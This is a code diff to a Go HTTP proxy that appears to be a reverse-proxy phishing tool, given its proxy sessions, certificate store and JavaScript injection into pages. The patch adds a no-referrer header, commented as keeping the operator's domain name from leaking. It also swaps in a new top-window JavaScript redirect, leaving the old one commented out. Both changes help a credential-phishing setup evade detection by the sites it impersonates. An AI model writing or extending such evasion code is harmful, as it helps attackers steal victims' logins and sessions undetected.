@@ -932,7 +932,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if resp == nil {
 				return nil
 			}
-
+			// block Referrer headers from leaking your domain name
+			resp.Header.Set("Referrer-Policy", "no-referrer")
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
@@ -1395,6 +1396,16 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
+        body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>window.top.location.assign('%s');</script></head><body></body></html>", rurl)
+        resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+        if resp != nil {
+                return req, resp
+        }
+        return req, nil
+}
+
+/*
+func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
 	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
@@ -1402,6 +1413,7 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 	}
 	return req, nil
 }
+*/
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
